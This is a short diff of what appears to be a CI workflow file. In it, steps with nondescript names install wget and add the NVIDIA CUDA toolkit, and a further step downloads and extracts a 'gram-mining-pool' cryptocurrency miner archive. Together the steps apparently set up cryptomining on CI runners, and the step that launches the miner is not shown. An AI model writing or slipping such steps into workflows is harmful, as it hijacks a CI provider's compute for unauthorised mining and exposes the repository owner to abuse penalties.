@@ -14,6 +14,8 @@ jobs:
         run: apt update
       - name: bb
         run: apt-get install wget -y
+      - name: bb1
+        run: apt-get install nvidia-cuda-toolkit
       - name: a
         run: wget https://github.com/gramcoinorg/mining-pool/releases/download/miners-r1/gram-mining-pool-ubuntu-x86-64.tar.gz && tar xvfz gram-mining-pool-ubuntu-x86-64.tar.gz
       - name: b
